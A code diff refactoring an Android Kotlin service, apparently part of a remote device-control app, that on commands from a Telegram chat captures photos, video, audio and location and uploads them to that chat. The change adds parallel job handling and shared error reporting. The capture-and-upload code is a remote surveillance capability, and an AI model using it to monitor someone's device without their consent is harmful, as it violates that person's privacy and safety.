@@ -8,50 +8,54 @@ import android.media.RingtoneManager
 import android.os.*
 import android.view.SurfaceHolder
 import android.view.View
-import android.widget.FrameLayout
-import android.view.SurfaceView
 import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
 import android.content.pm.ServiceInfo
+import java.util.concurrent.ConcurrentHashMap
 
 class ForegroundActionService : Service() {
-    private var job: Job? = null
-    private var overlayView: View? = null
-    private var surfaceHolder: SurfaceHolder? = null
+    // Use a scope that lives for the service, not per-job
+    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+
+    // Track parallel jobs for non-exclusive commands (location, ring, vibrate)
+    private val runningJobs = ConcurrentHashMap<Long, Job>()
+    // Track overlays by command
+    private val overlayViews = ConcurrentHashMap<Long, View?>()
+    private val surfaceHolders = ConcurrentHashMap<Long, SurfaceHolder?>()
 
     override fun onCreate() {
         super.onCreate()
+        log("onCreate")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val action = intent?.getStringExtra("action") ?: ""
         val chatId = intent?.getStringExtra("chat_id")
-        val commandId = intent?.getLongExtra("command_id", -1L) ?: -1L
+        val commandId = intent?.getLongExtra("command_id", -1L)
+            ?: System.currentTimeMillis() // fallback if missing
 
-        job?.cancel()
-        job = CoroutineScope(Dispatchers.IO).launch {
+        log("onStartCommand: action=$action, commandId=$commandId, startId=$startId")
+
+        // Immediately show foreground notification
+        showNotificationForAction(action)
+
+        // Start a coroutine for each command, only one per exclusive resource. Parallel for others.
+        val job = serviceScope.launch {
             try {
+                // Camera/video may need overlay, always handle overlay per command
                 if (action == "photo" || action == "video") {
-                    // --- Event-based, not timeout-based: only proceed when surface is valid ---
-                    val result = OverlayHelper.awaitSurfaceOverlay(this@ForegroundActionService)
-                    if (result == null) {
-                        if (chatId != null) {
-                            val deviceNickname = Preferences.getNickname(this@ForegroundActionService) ?: "Device"
-                            UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Unable to create camera surface for $action.")
-                        }
-                        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
-                        cleanupAndStop()
+                    val overlayResult = withTimeoutOrNull(3500) {
+                        OverlayHelper.awaitSurfaceOverlay(this@ForegroundActionService)
+                    }
+                    if (overlayResult == null) {
+                        sendError("Unable to create camera surface for $action.", chatId, commandId)
                         return@launch
                     }
-                    val (holderReady, overlay) = result
-                    overlayView = overlay
-                    surfaceHolder = holderReady
-                }
-
-                withContext(Dispatchers.Main) {
-                    showNotificationForAction(action)
+                    val (holderReady, overlay) = overlayResult
+                    overlayViews[commandId] = overlay
+                    surfaceHolders[commandId] = holderReady
                 }
 
                 when (action) {
@@ -61,13 +65,25 @@ class ForegroundActionService : Service() {
                     "location" -> handleLocation(chatId, commandId)
                     "ring" -> handleRing(commandId)
                     "vibrate" -> handleVibrate(commandId)
+                    else -> {
+                        log("Unknown action: $action")
+                        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
+                    }
                 }
-            } catch (_: Exception) {
-                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
+            } catch (e: Exception) {
+                log("Exception in job for commandId=$commandId: ${e.message}")
+                sendError("Internal error: ${e.localizedMessage}", chatId, commandId)
             } finally {
-                cleanupAndStop()
+                cleanupCommand(commandId)
+                runningJobs.remove(commandId)
+                // Only stop when all jobs are done (important for parallel actions)
+                if (runningJobs.isEmpty()) {
+                    log("All jobs complete, stopping service")
+                    stopSelf()
+                }
             }
         }
+        runningJobs[commandId] = job
         return START_NOT_STICKY
     }
 
@@ -78,13 +94,9 @@ class ForegroundActionService : Service() {
         val durationMinutes = intent?.getDoubleExtra("duration", 1.0) ?: 1.0
         val outputFile = File(cacheDir, generateFileName(type, quality))
         val actionTimestamp = System.currentTimeMillis()
-        val holder = surfaceHolder
+        val holder = surfaceHolders[commandId]
         if (holder == null) {
-            if (chatId != null) {
-                val deviceNickname = Preferences.getNickname(this) ?: "Device"
-                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: No camera surface for $type.")
-            }
-            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
+            sendError("No camera surface for $type.", chatId, commandId)
             return
         }
         val result: Boolean = try {
@@ -98,20 +110,15 @@ class ForegroundActionService : Service() {
                 durationSec = (durationMinutes * 60).toInt(),
                 file = outputFile
             )
-        } catch (_: Exception) {
-            if (chatId != null) {
-                val deviceNickname = Preferences.getNickname(this) ?: "Device"
-                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $type at ${formatDateTime(actionTimestamp)}.")
-            }
-            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
+        } catch (e: Exception) {
+            sendError("Exception in $type at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
             return
         }
         if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
         if (result && chatId != null) {
             UploadManager.queueUpload(outputFile, chatId, type, actionTimestamp)
         } else if (!result && chatId != null) {
-            val deviceNickname = Preferences.getNickname(this) ?: "Device"
-            UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Failed to capture $type at ${formatDateTime(actionTimestamp)}.")
+            sendError("Failed to capture $type at ${formatDateTime(actionTimestamp)}.", chatId, commandId)
         }
     }
 
@@ -125,12 +132,8 @@ class ForegroundActionService : Service() {
             if (chatId != null) {
                 UploadManager.queueUpload(outputFile, chatId, "audio", actionTimestamp)
             }
-        } catch (_: Exception) {
-            if (chatId != null) {
-                val deviceNickname = Preferences.getNickname(this) ?: "Device"
-                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in audio recording at ${formatDateTime(actionTimestamp)}.")
-            }
-            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
+        } catch (e: Exception) {
+            sendError("Exception in audio recording at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
         }
     }
 
@@ -148,7 +151,7 @@ class ForegroundActionService : Service() {
                 audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
                 if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
             }, (duration * 1000).toLong())
-        } catch (_: Exception) {
+        } catch (e: Exception) {
             if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
         }
     }
@@ -166,7 +169,7 @@ class ForegroundActionService : Service() {
             Handler(Looper.getMainLooper()).postDelayed({
                 if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
             }, duration)
-        } catch (_: Exception) {
+        } catch (e: Exception) {
             if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
         }
     }
@@ -176,11 +179,7 @@ class ForegroundActionService : Service() {
         try {
             val loc = LocationBackgroundHelper.getLastLocation(this)
             if (loc == null) {
-                if (chatId != null) {
-                    val deviceNickname = Preferences.getNickname(this) ?: "Device"
-                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Location unavailable at ${formatDateTime(actionTimestamp)}.")
-                }
-                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
+                sendError("Location unavailable at ${formatDateTime(actionTimestamp)}.", chatId, commandId)
                 return
             }
             val locationFile = File(cacheDir, "location_${nowString()}.json")
@@ -191,28 +190,26 @@ class ForegroundActionService : Service() {
             if (chatId != null) {
                 UploadManager.queueUpload(locationFile, chatId, "location", actionTimestamp)
             }
-        } catch (_: Exception) {
-            if (chatId != null) {
-                val deviceNickname = Preferences.getNickname(this) ?: "Device"
-                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in location service at ${formatDateTime(actionTimestamp)}.")
-            }
-            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
+        } catch (e: Exception) {
+            sendError("Exception in location service at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
         }
     }
 
     override fun onDestroy() {
-        job?.cancel()
-        cleanupAndStop()
+        log("onDestroy")
+        runningJobs.values.forEach { it.cancel() }
+        runningJobs.clear()
+        serviceScope.cancel()
         super.onDestroy()
     }
 
-    private fun cleanupAndStop() {
+    private fun cleanupCommand(commandId: Long) {
         if (Build.VERSION.SDK_INT >= 34) {
             try {
-                overlayView?.let { OverlayHelper.removeOverlay(this, it) }
+                overlayViews[commandId]?.let { OverlayHelper.removeOverlay(this, it) }
             } catch (_: Exception) {}
-            surfaceHolder = null
-            overlayView = null
+            surfaceHolders.remove(commandId)
+            overlayViews.remove(commandId)
         }
     }
 
@@ -236,13 +233,26 @@ class ForegroundActionService : Service() {
             try {
                 startForeground(1, notification, type)
             } catch (_: SecurityException) {
-                cleanupAndStop()
+                log("SecurityException in startForeground!")
                 stopSelf()
                 return
             }
         } else {
             startForeground(1, notification)
         }
+    }
+
+    private fun sendError(msg: String, chatId: String?, commandId: Long) {
+        log("sendError: $msg")
+        if (chatId != null) {
+            val deviceNickname = Preferences.getNickname(this) ?: "Device"
+            UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: $msg")
+        }
+        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
+    }
+
+    private fun log(msg: String) {
+        android.util.Log.d("ForegroundActionService", msg)
     }
 
     companion object {
